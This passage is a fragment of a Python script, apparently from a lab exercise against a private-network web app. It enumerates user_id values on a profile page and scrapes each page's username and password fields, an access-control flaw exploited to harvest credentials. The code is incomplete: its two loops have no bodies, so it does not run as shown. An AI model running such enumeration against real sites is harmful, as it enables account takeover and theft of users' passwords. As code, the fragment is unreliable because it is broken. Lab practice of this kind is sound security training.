    url= 'http://192.168.241.128/index.php?page=profile&user_id={}'.format(i)

    r = requests.get(url=url,headers=headers)

    soup = BeautifulSoup(r.content, 'lxml', from_encoding='utf-8')

    for x in soup.find_all('input',id="username"):

    for y in soup.find_all('input',id="password"):
